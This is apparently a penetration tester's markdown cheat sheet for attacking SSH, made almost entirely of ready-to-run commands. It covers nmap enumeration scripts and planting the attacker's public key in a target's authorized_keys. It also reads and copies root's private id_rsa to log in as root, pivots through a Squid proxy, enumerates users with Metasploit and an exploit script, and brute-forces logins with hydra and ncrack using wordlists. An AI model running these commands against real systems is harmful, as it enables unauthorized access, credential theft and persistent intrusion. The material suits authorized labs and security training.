# SSH

https://recipeforroot.com/misconfigured-ssh-keys/
https://www.ssh.com/ssh/host-key
http://lerned.wikidot.com/ssh

==the file has to have the right permissions: chmod 600==

**ssh -i "private rsa file"**
Can you login with a password? try name: name or name:password
grep -i PermitRootLogin /etc/ssh/sshd_config

`nmap {nmap_extra} -sV -p {port} --script="ssh2-enum-algos,ssh-hostkey,ssh-auth-methods"`
`nmap','-n','-sV','-Pn','-vv','-p',port,'--script=banner,ssh-auth-methods,sshv1,ssh2-enum-algos,vulners','-oA','/root/scripts/recon_enum/results/exam/ssh/%s_%s_ssh' % (ip_address,port),ip_address])`
`openssl','s_client','-connect','%s:%s' % (ip_address,port)],stderr=errfile)`
`nmap -sV --version-all -n -Pn -p 22 --script="default,freevulnsearch,ssh-run,ssh2-enum-algos,ssh-hostkey,ssh-auth-methods,ssh-publickey-acceptance" 10.11.1.44`



### SSH config on box - SSH w/Key File
`cat /etc/ssh/sshd_config`



## Generate SSH RSA key

`ssh-keygen -b 2048 -t rsa`

if you get access to a user directory ie; via FTP, you can create the .ssh dir,upload your public key and rename it to authorized_keys so that you can then ssh in as the user without providing a password
this is due to ssh configs and where they grab these keys from this is default behavior
`ssh-keygen -f writeup`
writeup = private key, writeup.pub = public key

`echo "public_key" > /[user]/.ssh/authorized_keys on target machine`
`chmod 600 public key`

**`chmod 600 writeup`**
`ssh -i writeup root@10.10.10.138`
connect with private key via ssh to target: `ssh noob@192.168.56.120 -i [key file]` like .ssh/id_rsa or just keik

One thing we know about .ssh directories in users home directories, is that they often contain an “id_rsa” SSH private key file (along with its .pub Public Key counterpart) when that particular user is configured for Public Key Authentication in regards to SSH connections. With that said, knowing these directories often contain “id_rsa” SSH private keys, let’s see if we can read it:
`cd /root/.ssh && cat /root/.ssh/id_rsa`
`cp /root/.ssh/id_rsa /home/lowpriv/.ssh`
`chmod o-rwx /home/lowpriv/.ssh/id_rsa`

`ssh -i /home/lowpriv/.ssh/id_rsa root@localhost`

Use this command to connect if you have a private key and it’s password as it takes both
keep in mind the public key will also have to be in the authorized_keys on the target.  
`ssh -i id_rsa takis@10.10.10.10`



## SSH via proxychains and Squid
/etc/proxychains.conf - in ProxyList section
http 192.168.100.164 3128

`proxychains ssh john@192.168.100.164`

**execute commands via ssh**
`proxychains ssh john@192.168.100.165 '/bin/bash'`

### Metasploit

msf > use auxiliary/scanner/ssh/ssh_enumusers
msf auxiliary(scanner/ssh/ssh_enumusers) > set RHOSTS 192.168.31.149
RHOSTS => 192.168.31.149
msf auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
USER_FILE => /usr/share/wordlists/metasploit/unix_users.txt
msf auxiliary(scanner/ssh/ssh_enumusers) > run

## SSH bruteforce
`ncrack -p ssh -u root -P 500-worst-passwords.txt -T5 10.10.10.10`
`hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.13.234 ssh`
hydra -t 4 -L /usr/share/wordlists/cristi.txt -P /usr/share/wordlists/cristi-passwords.txt 192.168.13.236 ssh
`hydra -t 4 -L /usr/share/wordlists/cristi.txt -p some_passsword 192.168.13.236 ssh`
`hydra -t 4 -l root -P /usr/share/wordlists/cristi-passwords.txt 127.0.0.1 -s 50000 ssh`

/usr/share/wordlists/SecLists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt
hydra -C default_accounts.txt ftp://localhost

`hydra -L "{username_wordlist}" -P "{password_wordlist}" -e nsr -s {port}` 

python ./40136.py 192.168.31.149 -U /usr/share/wordlists/metasploit/unix_users.txt -e --trials 5 --bytes 10

### SSH Bad Keys

https://github.com/rapid7/ssh-badkeys